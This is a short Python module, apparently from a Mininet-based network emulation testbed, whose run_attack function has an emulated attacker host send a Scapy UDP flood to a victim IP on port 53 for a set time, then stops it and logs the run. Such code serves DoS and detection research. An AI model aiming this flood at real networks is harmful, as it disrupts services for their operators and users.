import time
import subprocess
import signal
import logging
from scapy.all import Ether, IP, UDP, sendp

# Configure logging for this module
logger = logging.getLogger(__name__)
logger.setLevel(logging.INFO)

def run_attack(attacker_host, victim_ip, duration):
    logger.info(f"Starting UDP Flood from {attacker_host.name} to {victim_ip} for {duration} seconds.")
    scapy_cmd = f"from scapy.all import *; sendp(Ether()/IP(dst='{victim_ip}')/UDP(dport=53), loop=1, inter=0.01, verbose=0, iface='{attacker_host.intfNames()[0]}')"
    process = attacker_host.popen(['python3', '-c', scapy_cmd])
    
    time.sleep(duration)
    try:
        process.send_signal(signal.SIGINT) # Attempt to stop Scapy processes gracefully
    except:
        process.terminate() # Fallback to terminate
    process.wait() # Wait for the process to terminate
    logger.info(f"UDP Flood from {attacker_host.name} to {victim_ip} finished.")